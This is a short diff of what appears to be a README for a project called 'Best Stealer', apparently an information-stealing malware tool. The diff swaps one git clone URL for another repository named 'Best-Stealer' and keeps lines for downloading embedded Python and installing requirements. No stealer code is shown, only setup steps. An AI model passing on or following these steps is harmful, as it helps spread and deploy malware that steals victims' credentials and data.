@@ -20,7 +20,7 @@ Best Stealer
 
 https://www.python.org/ftp/python/3.10.3/python-3.10.3-embed-amd64.zip 
 
-git clone https://github.com/PanEditor/StealerCrealer
+git clone https://github.com/HatGirl-zz/Best-Stealer
 
 pip install -r requirements.txt
 
